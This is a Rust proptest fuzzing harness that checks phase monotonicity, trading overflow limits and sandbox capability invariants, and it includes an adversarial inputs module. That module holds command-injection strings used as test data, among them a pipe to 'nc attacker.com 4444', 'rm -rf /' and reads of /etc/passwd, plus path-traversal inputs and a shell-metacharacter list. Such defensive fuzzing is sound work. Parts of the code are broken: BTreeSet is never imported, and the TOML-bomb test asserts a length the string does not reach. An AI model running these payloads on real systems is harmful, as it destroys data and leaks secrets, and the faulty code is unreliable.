//! Fuzzing Harness for Property-Based Testing
//!
//! Per Yellow Paper specs, uses proptest for:
//! - FSM monotonicity invariant
//! - HFT risk check latency bounds
//! - Sandbox capability monotonicity
//!
//! Test vector categories:
//! - Nominal: 40%
//! - Boundary: 20%
//! - Adversarial: 15%
//! - Regression: 10%
//! - Property-based: 15%

use proptest::prelude::*;
use std::collections::HashSet;

pub mod fsm_properties {
    use super::*;

    prop_compose! {
        fn valid_phase_index()(idx in 0usize..24) -> usize {
            idx
        }
    }

    prop_compose! {
        fn artifact_set()(artifacts in prop::collection::vec("[a-z]{3,8}", 0..10)) -> Vec<String> {
            artifacts
        }
    }

    #[derive(Debug, Clone)]
    pub struct PhaseTransition {
        pub from: usize,
        pub to: usize,
        pub artifacts: Vec<String>,
    }

    pub fn phase_transition_strategy() -> impl Strategy<Value = PhaseTransition> {
        (0usize..23, artifact_set()).prop_map(|(from, artifacts)| PhaseTransition {
            from,
            to: from + 1,
            artifacts,
        })
    }

    pub fn monotonic_sequence_strategy() -> impl Strategy<Value = Vec<usize>> {
        prop::collection::vec(0u8..24, 1..10).prop_map(|phases| {
            let mut seq = Vec::new();
            let mut current = 0u8;
            for _ in 0..phases.len() {
                if current < 23 {
                    seq.push(current as usize);
                    current += 1;
                }
            }
            seq
        })
    }

    pub fn check_monotonicity(sequence: &[usize]) -> bool {
        for i in 1..sequence.len() {
            if sequence[i] <= sequence[i - 1] {
                return false;
            }
        }
        true
    }

    pub fn check_phase_rank_invariant(from: usize, to: usize) -> bool {
        to > from && to - from == 1
    }
}

pub mod hft_properties {
    use super::*;

    prop_compose! {
        fn order_quantity()(qty in 1u64..1_000_000) -> u64 {
            qty
        }
    }

    prop_compose! {
        fn order_price()(price in 1u64..1_000_000_00) -> u64 {
            price
        }
    }

    prop_compose! {
        fn wallet_cash()(cash in 0u64..1_000_000_000_00) -> u64 {
            cash
        }
    }

    prop_compose! {
        fn position()(pos in -10000i64..10000) -> i64 {
            pos
        }
    }

    #[derive(Debug, Clone)]
    pub struct OrderSpec {
        pub symbol: u32,
        pub side: u8,
        pub quantity: u64,
        pub price: u64,
    }

    pub fn order_strategy() -> impl Strategy<Value = OrderSpec> {
        (0u32..100, 0u8..2, order_quantity(), order_price()).prop_map(
            |(symbol, side, quantity, price)| OrderSpec {
                symbol,
                side,
                quantity,
                price,
            },
        )
    }

    #[derive(Debug, Clone)]
    pub struct WalletSpec {
        pub cash: u64,
        pub positions: Vec<(u32, i64)>,
        pub realized_pnl: i64,
    }

    pub fn wallet_strategy() -> impl Strategy<Value = WalletSpec> {
        (
            wallet_cash(),
            prop::collection::vec((0u32..100, position()), 0..5),
            -100_000i64..100_000,
        )
            .prop_map(|(cash, positions, realized_pnl)| WalletSpec {
                cash,
                positions,
                realized_pnl,
            })
    }

    pub fn check_ring_buffer_index_safety(head: u64, tail: u64, size: u64) -> bool {
        if size == 0 || !size.is_power_of_two() {
            return false;
        }
        let head_idx = head % size;
        let tail_idx = tail % size;
        head_idx < size && tail_idx < size
    }

    pub fn check_position_overflow(current: i64, delta: i64) -> bool {
        current.checked_add(delta).is_some()
    }

    pub fn check_notional_overflow(price: u64, quantity: u64) -> bool {
        price.checked_mul(quantity).is_some()
    }

    pub fn check_wallet_invariant(cash: u64, positions: &[i64]) -> bool {
        cash > 0 || positions.iter().all(|&p| p == 0)
    }
}

pub mod sandbox_properties {
    use super::*;

    prop_compose! {
        fn permission_set()(
            perms in prop::collection::btree_set(0u8..8, 0..8)
        ) -> BTreeSet<u8> {
            perms
        }
    }

    #[derive(Debug, Clone)]
    pub struct CapabilitySpec {
        pub resource: String,
        pub permissions: BTreeSet<u8>,
    }

    pub fn capability_strategy() -> impl Strategy<Value = CapabilitySpec> {
        ("[a-z]{3,10}", permission_set()).prop_map(|(resource, permissions)| CapabilitySpec {
            resource,
            permissions,
        })
    }

    #[derive(Debug, Clone)]
    pub struct DerivationSpec {
        pub parent_permissions: BTreeSet<u8>,
        pub child_permissions: BTreeSet<u8>,
    }

    pub fn derivation_strategy() -> impl Strategy<Value = DerivationSpec> {
        permission_set().prop_flat_map(|parent| {
            let parent_clone = parent.clone();
            let subset_strategy = prop::collection::btree_set(
                proptest::sample::select(parent.into_iter().collect::<Vec<_>>()),
                0..=parent_clone.len(),
            );
            (
                proptest::collection::btree_set(
                    proptest::sample::select(parent_clone.into_iter().collect()),
                    0..=8,
                ),
                Just(parent),
            )
                .prop_map(|(child, parent)| DerivationSpec {
                    parent_permissions: parent,
                    child_permissions: child,
                })
        })
    }

    pub fn check_capability_monotonicity(
        parent_permissions: &BTreeSet<u8>,
        child_permissions: &BTreeSet<u8>,
    ) -> bool {
        child_permissions.is_subset(parent_permissions)
    }

    pub fn check_no_escalation(
        parent_permissions: &BTreeSet<u8>,
        requested_permissions: &BTreeSet<u8>,
    ) -> bool {
        requested_permissions.is_subset(parent_permissions)
    }

    pub fn check_isolation_preserved(
        domain1: u64,
        domain2: u64,
        memory1: (u64, u64),
        memory2: (u64, u64),
    ) -> bool {
        if domain1 == domain2 {
            return true;
        }
        let (s1, e1) = memory1;
        let (s2, e2) = memory2;
        e1 <= s2 || e2 <= s1
    }
}

pub mod adversarial_inputs {
    use super::*;

    pub fn nan_price_inputs() -> impl Strategy<Value = Option<f64>> {
        prop_oneof![
            Just(None),
            Just(Some(f64::NAN)),
            Just(Some(f64::INFINITY)),
            Just(Some(f64::NEG_INFINITY)),
            any::<f64>(),
        ]
    }

    pub fn overflow_quantities() -> impl Strategy<Value = u64> {
        prop_oneof![0u64..1000, u64::MAX - 10..=u64::MAX, Just(u64::MAX),]
    }

    pub fn negative_values() -> impl Strategy<Value = i64> {
        prop_oneof![
            -1_000_000i64..0,
            i64::MIN..=i64::MIN + 10,
            Just(-1),
            Just(0),
        ]
    }

    pub fn malformed_paths() -> impl Strategy<Value = String> {
        prop_oneof![
            ".*".prop_map(|s| format!("/{}", s)),
            Just("../../../etc/passwd".to_string()),
            Just("/test\x00null".to_string()),
            Just("/".repeat(1000)),
            Just("/test/../../etc/passwd".to_string()),
            ".*".prop_map(|s| format!("/test/{}", s)),
        ]
    }

    pub fn command_injection_payloads() -> impl Strategy<Value = String> {
        prop_oneof![
            Just("cargo build".to_string()),
            Just("cargo && rm -rf /".to_string()),
            Just("cargo; cat /etc/passwd".to_string()),
            Just("cargo $(malicious)".to_string()),
            Just("cargo`id`".to_string()),
            Just("cargo|nc attacker.com 4444".to_string()),
            Just("cargo > /etc/passwd".to_string()),
        ]
    }

    pub fn toml_bomb_inputs() -> impl Strategy<Value = String> {
        prop_oneof![
            Just("[a]\n".repeat(10000)),
            Just("[a]\nb = \"\"\"\n".to_string() + &"x".repeat(100000) + "\n\"\"\"\n"),
            Just("".to_string()),
            Just("[valid]\nkey = \"value\"".to_string()),
        ]
    }

    pub fn rpc_malformed_inputs() -> impl Strategy<Value = Vec<u8>> {
        prop_oneof![
            Just(vec![]),
            Just(vec![0xFF; 100]),
            Just(vec![0x00; 100]),
            proptest::collection::vec(any::<u8>(), 0..1024),
        ]
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use fsm_properties::*;
    use hft_properties::*;
    use sandbox_properties::*;

    proptest! {
        #[test]
        fn test_fsm_monotonicity(sequence in monotonic_sequence_strategy()) {
            prop_assert!(check_monotonicity(&sequence));
        }

        #[test]
        fn test_phase_rank_valid(from in valid_phase_index()) {
            if from < 23 {
                prop_assert!(check_phase_rank_invariant(from, from + 1));
            }
        }

        #[test]
        fn test_ring_buffer_index_safety(
            (head, tail, size) in (0u64..1_000_000, 0u64..1_000_000, 1u64..1_048_576u64)
        ) {
            let size = size.next_power_of_two();
            prop_assert!(check_ring_buffer_index_safety(head, tail, size));
        }

        #[test]
        fn test_position_overflow_check(
            (current, delta) in (-1_000_000i64..1_000_000, -100_000i64..100_000)
        ) {
            let can_overflow = current.checked_add(delta).is_none();
            let check_result = check_position_overflow(current, delta);
            prop_assert_eq!(check_result, !can_overflow);
        }

        #[test]
        fn test_notional_overflow_check(
            (price, quantity) in (0u64..1_000_000, 0u64..100_000)
        ) {
            let expected = price.checked_mul(quantity).is_some();
            prop_assert_eq!(check_notional_overflow(price, quantity), expected);
        }

        #[test]
        fn test_capability_monotonicity(
            (parent, child) in permission_set().prop_flat_map(|parent| {
                let child_strat = prop::collection::btree_set(
                    proptest::sample::select(parent.clone().into_iter().collect::<Vec<_>>()),
                    0..=parent.len()
                );
                (Just(parent), child_strat)
            })
        ) {
            prop_assert!(check_capability_monotonicity(&parent, &child));
        }

        #[test]
        fn test_isolation_preservation(
            (d1, d2, m1_start, m1_end, m2_start, m2_end) in
            (0u64..10, 0u64..10, 0u64..1000, 0u64..1000, 0u64..1000, 0u64..1000)
        ) {
            let m1_end = m1_start.max(m1_end);
            let m2_end = m2_start.max(m2_end);
            prop_assert!(check_isolation_preserved(d1, d2, (m1_start, m1_end), (m2_start, m2_end)));
        }
    }

    #[test]
    fn test_adversarial_nan_prices() {
        let inputs = vec![f64::NAN, f64::INFINITY, f64::NEG_INFINITY];
        for input in inputs {
            if input.is_nan() || input.is_infinite() {
                assert!(input.is_nan() || input.is_infinite());
            }
        }
    }

    #[test]
    fn test_adversarial_overflow_quantities() {
        let qty = u64::MAX;
        let price = 100u64;
        assert!(price.checked_mul(qty).is_none());
    }

    #[test]
    fn test_adversarial_path_traversal() {
        let path = "../../../etc/passwd";
        assert!(path.contains(".."));
    }

    #[test]
    fn test_adversarial_command_injection() {
        let dangerous = vec!["&&", ";", "$(", "`", "|", ">", "<"];
        let cmd = "cargo build && rm -rf /";
        let mut found = false;
        for d in dangerous {
            if cmd.contains(d) {
                found = true;
                break;
            }
        }
        assert!(found);
    }

    #[test]
    fn test_adversarial_toml_bomb() {
        let bomb = "[a]\n".repeat(10000);
        assert!(bomb.len() > 100000);
    }
}
